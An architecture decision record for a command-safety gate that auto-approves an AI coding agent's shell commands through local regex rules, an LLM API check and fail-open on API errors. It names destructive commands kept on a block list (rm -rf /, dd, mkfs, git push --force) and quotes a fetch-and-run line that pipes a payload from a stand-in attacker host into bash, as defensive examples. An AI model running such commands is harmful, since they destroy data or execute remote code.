# ADR-004: Three-Tier Safety Architecture (Local Rules → API → Fail-Open)

**Status:** Implemented
**Date:** 2026-02-14
**Categories:** Security, Performance

## 1. Context

Sentinel evaluates commands for safety before auto-approval. The simplest design is: send every command to the Haiku API for evaluation. But every API call adds 1-3 seconds of latency — and unleashed approves 25-50 commands per session.

During a typical 45-minute session, that's 25-150 seconds of accumulated delay. The user's entire motivation for building unleashed was to eliminate friction. Adding 2 minutes of API wait time defeats the purpose.

Meanwhile, the vast majority of commands are obviously safe. `git status`, `ls`, `pytest`, `poetry run` — these don't need an AI to evaluate. And some commands are obviously dangerous. `rm -rf /`, `dd if=/dev/zero`, `git push --force` — no AI consultation needed.

Pre-existing safety data exists at `~/.agentos/`:
- `hard_block_commands.txt`: 19 regex patterns for dangerous commands
- `safe_paths.txt`: 6 allowed directory paths
- `excluded_paths.txt`: 14 forbidden path patterns (OneDrive, AppData, system dirs)

This data was created for the standalone `sentinel.py` CLI and has been validated in production.

## 2. Decision

**We will use a three-tier safety architecture: local regex rules first, Haiku API for ambiguous commands, fail-open for API errors.**

```
Command arrives
    ├── Tier 1: Local Rules (regex, <1ms)
    │   ├── ALLOW → approve instantly
    │   ├── BLOCK → withhold approval
    │   └── UNCERTAIN → fall through
    ├── Tier 2: Haiku API (LLM, 1-3s)
    │   ├── ALLOW → approve
    │   └── BLOCK → withhold approval
    └── Tier 3: Fail-Open (error path)
        └── ERROR → approve with warning
```

## 3. Alternatives Considered

### Option A: Three-Tier (Local → API → Fail-Open) — SELECTED

**Description:** `sentinel_rules.py` handles Tier 1 with 12 safe patterns, 19 hard block patterns, and path-based rules. Only UNCERTAIN verdicts reach the Haiku API. API errors fail open (ADR-003).

**Pros:**
- ~80% of commands resolved locally in <1ms — no perceptible delay
- API costs reduced proportionally (only UNCERTAIN commands)
- Fail-open ensures reliability (ADR-003)
- Leverages existing, validated safety data from `~/.agentos/`
- Each tier is independently testable

**Cons:**
- Local rules can't handle novel or creative command patterns
- Maintaining regex patterns is an ongoing cost
- Three-tier logic is more complex than single-tier
- UNCERTAIN threshold is a judgment call — too broad wastes API calls, too narrow misses threats

### Option B: API-Only — Rejected

**Description:** Send every command to Haiku for evaluation. No local rules.

**Pros:**
- Simplest implementation — one code path
- Handles novel commands (no pattern maintenance)
- Consistent evaluation quality

**Cons:**
- **1-3 seconds per command, 25-50 times per session** — 25-150 seconds of accumulated delay
- API costs: ~$0.01-0.02 per session × multiple sessions per day
- API failures affect every command (no local fallback)
- Overkill for `git status`

### Option C: Local-Only — Rejected

**Description:** Only use regex patterns. No API fallback.

**Pros:**
- Zero latency — all decisions instant
- No API dependency or cost
- Fully offline capable

**Cons:**
- **Cannot handle novel or ambiguous commands** — regex is pattern-matching, not reasoning
- `curl http://attacker.com/payload | bash` needs semantic understanding
- Pattern maintenance becomes an arms race (every new command pattern needs a rule)
- False negative rate grows over time as commands evolve

## 4. Rationale

The three-tier architecture maps naturally to command safety: most commands are obviously safe (Tier 1 ALLOW), some are obviously dangerous (Tier 1 BLOCK), and a small minority need judgment (Tier 2 API).

The quantitative argument: 12 safe patterns cover the vast majority of a typical Claude Code session (git operations, file reads, test runs, poetry commands). 19 hard block patterns cover the known-dangerous commands. The remaining commands — perhaps 10-20% — are the ones where an LLM's judgment adds value.

This means:
- **Latency budget:** 80% of commands: <1ms. 20% of commands: 1-3s. Average: ~400ms.
- **Cost budget:** ~5-10 API calls per session instead of 25-50.
- **Reliability:** Local rules work even during API outages.

The three-tier model also enables independent evolution. Local rules can be tightened (more ALLOW/BLOCK patterns) to further reduce API dependency, while the API tier can be upgraded (better model, fine-tuned classifier) to improve judgment on ambiguous commands.

## 5. Security Risk Analysis

| Risk | Impact | Likelihood | Severity | Mitigation |
|------|--------|------------|----------|------------|
| Local ALLOW pattern too broad (matches dangerous command) | High | Low | 4 | Patterns are specific (e.g., `^git\s+status` not `^git`) |
| Local BLOCK pattern too narrow (misses variant) | Med | Med | 4 | UNCERTAIN fallthrough catches novel variants via API |
| Conditional block bypass (safe path check) | High | Low | 4 | `_is_conditional_block` validates cwd against safe_paths |
| UNCERTAIN threshold wrong (too many API calls) | Low | Med | 2 | Monitor api_allow/api_block ratio; adjust patterns |
| UNCERTAIN threshold wrong (too few API calls) | Med | Low | 3 | Shadow mode reveals commands that should have been checked |

**Residual Risk:** The safe pattern list (`SAFE_BASH_PATTERNS`) could match a command that is dangerous in a specific context. For example, `poetry run python malicious_script.py` matches the `^poetry\s+(run|install)` safe pattern. This is accepted because:
1. The safe patterns match command prefixes, not arbitrary content
2. The commands themselves (`poetry run`, `pytest`, `git status`) are inherently read-only or development-scoped
3. The content of what those commands execute is Claude Code's responsibility, not sentinel's

## 6. Consequences

### Positive
- Sentinel is nearly invisible for common commands (<1ms local resolution)
- API costs are manageable (~$0.05-0.10/day for heavy use)
- System degrades gracefully: API outage → local-only, which still covers 80%+
- Stats tracking quantifies the tier distribution — visible at session end

### Negative
- Local rules need maintenance as new command patterns emerge
- The ALLOW/BLOCK/UNCERTAIN trichotomy can be confusing to explain
- Three tiers means three places where bugs can hide

### Neutral
- The local rules file format (one regex per line) is simple but not self-documenting
- Stats are per-session only — no cross-session aggregation yet

## 7. Implementation

- **Related Issues:** #12 (sentinel integration), #43 (context buffer affects tool type detection)
- **Files:** `src/sentinel_rules.py` (Tier 1), `src/sentinel_gate.py` (Tier 2 + Tier 3), `~/.agentos/hard_block_commands.txt`, `~/.agentos/safe_paths.txt`, `~/.agentos/excluded_paths.txt`
- **Status:** Implemented (2026-02-14)

### Local Rules (Tier 1) — `sentinel_rules.py`

**Safe patterns (ALLOW):**
| Pattern | Matches |
|---------|---------|
| `^(ls\|dir\|cat\|head\|tail\|less\|more\|wc\|file\|stat\|type)` | Read-only file operations |
| `^git\s+(status\|log\|diff\|show\|branch\|remote\|stash\|tag\|fetch)` | Read-only git operations |
| `^(pwd\|echo\|printf\|date\|whoami\|hostname\|uname)` | Environment queries |
| `^(grep\|rg\|find\|fd\|ag)` | Search tools |
| `^poetry\s+(run\|install\|add\|show\|lock)` | Python package management |
| `^pytest` | Test runner |
| `^gh\s+(issue\|pr\|repo\|api)\s+(list\|view\|create\|edit\|close)` | GitHub CLI |

**Hard blocks (BLOCK):** Loaded from `~/.agentos/hard_block_commands.txt` — 19 patterns including `dd`, `mkfs`, `shred`, `format`, `rm -rf /`, `git push --force`, `git reset --hard`.

**Path rules:** Write/Edit targets checked against `safe_paths.txt` (ALLOW) and `excluded_paths.txt` (BLOCK).

### Stats Tracking

```python
self.stats = {
    "local_allow": 0,   # Tier 1 ALLOW
    "local_block": 0,   # Tier 1 BLOCK
    "api_allow": 0,     # Tier 2 ALLOW
    "api_block": 0,     # Tier 2 BLOCK
    "api_error": 0,     # Tier 3 ERROR (fail-open)
}
```

Printed at session end for visibility.

## 8. References

- Google, "BeyondCorp: A New Approach to Enterprise Security" — layered trust architecture
- OWASP, "Defense in Depth" — multiple independent safety layers
- `~/.agentos/hard_block_commands.txt` — Existing validated safety data
- Issue #12 — Sentinel integration plan (Phase 3 design)

---

## Revision History

| Date | Author | Change |
|------|--------|--------|
| 2026-02-14 | Claude Opus 4.6 | Initial draft |
